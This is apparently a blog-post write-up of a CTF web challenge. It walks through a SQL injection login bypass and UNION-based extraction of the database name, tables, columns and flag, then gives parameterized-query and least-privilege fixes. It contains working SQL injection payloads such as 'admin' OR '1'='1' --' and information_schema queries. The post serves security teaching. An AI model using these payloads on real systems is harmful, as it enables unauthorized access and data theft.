+++
title = '[CTF Write-up] SQL Injection - Basic to Advanced'
date = '2026-05-10T14:00:00+07:00'
draft = false
tags = ['ctf', 'writeup', 'web', 'sql-injection']
categories = ['CTF Write-ups', 'Web Security']
+++

## Challenge Information

- **CTF**: CyberKnight CTF 2025
- **Category**: Web Exploitation
- **Difficulty**: Medium
- **Points**: 300
- **Solves**: 45/200 teams

## Description

```
We detected a login page that seems insecure.
Find a way to bypass authentication and retrieve the flag!

URL: http://challenge.cyberknight.vn:8080
```

## Initial Analysis

When visiting the website, we are presented with a simple login form:

```html
<form method="POST" action="/login">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Login</button>
</form>
```

### Testing for SQL Injection

Trying a basic payload:
```
Username: admin' OR '1'='1
Password: anything
```

**Result**: An error message appears!
```
SQL Error: You have an error in your SQL syntax...
```

This confirms that the web application is vulnerable to SQL Injection.

## Exploitation

### Step 1: Bypass Authentication

Using a classic payload:
```sql
Username: admin' OR '1'='1' --
Password: (leave blank)
```

**Explanation**:
- `admin'` closes the string in the query.
- `OR '1'='1'` is a condition that always evaluates to true.
- `--` comments out the rest of the query.

The backend query likely looks something like this:
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' -- ' AND password='...'
```

### Step 2: Enumerate Database

After successfully bypassing the login, we need to locate the flag. We can use UNION-based SQLi:

```sql
' UNION SELECT 1,2,3,4,5 --
```

Iterate through the number of columns until there is no error. Let's assume the table has 5 columns.

### Step 3: Extract Database Information

```sql
' UNION SELECT 1,database(),user(),version(),5 --
```

**Output**:
```
Database: ctf_db
User: ctf_user@localhost
Version: 8.0.32
```

### Step 4: List Tables

```sql
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema='ctf_db' --
```

**Tables found**:
- users
- admin_panel
- secret_flags

### Step 5: Extract Flag

```sql
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='secret_flags' --
```

**Columns**:
- id
- flag_content
- description

Final payload:
```sql
' UNION SELECT 1,flag_content,3,4,5 FROM secret_flags --
```

## Flag

```
CyberKnight{SQL_1nj3ct10n_1s_st1ll_d4ng3r0us_2025}
```

## Mitigation

### 1. Prepared Statements (Recommended)

**Python (Flask + SQLAlchemy)**:
```python
from sqlalchemy import text

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Safe: Using parameterized query
    query = text("SELECT * FROM users WHERE username=:user AND password=:pass")
    result = db.session.execute(query, {"user": username, "pass": password})
    
    if result.fetchone():
        return "Login successful"
    return "Login failed"
```

**PHP (PDO)**:
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

### 2. Input Validation

```python
import re

def validate_username(username):
    # Only allow alphanumeric and underscore characters
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        return False
    return True
```

### 3. Principle of Least Privilege

```sql
-- Create a user with restricted permissions
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT ON database.users TO 'app_user'@'localhost';
-- Do not grant access to information_schema
```

### 4. Web Application Firewall (WAF)

Utilize ModSecurity or a cloud WAF to filter common SQL injection patterns.

## Lessons Learned

1. **Never trust user input**: Always validate and sanitize.
2. **Use parameterized queries**: Avoid string concatenation in queries.
3. **Principle of least privilege**: The database user should only have necessary permissions.
4. **Error handling**: Never display raw SQL errors to users.
5. **Security testing**: Conduct regular penetration testing and code reviews.

## Tools Used

- **Burp Suite**: To intercept and modify HTTP requests.
- **SQLMap**: Automated SQL injection tool.
- **Browser DevTools**: To analyze server responses.

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

**Difficulty Rating**: ⭐⭐⭐☆☆

If you have any questions regarding this write-up, feel free to contact: nhatran.network@gmail.com
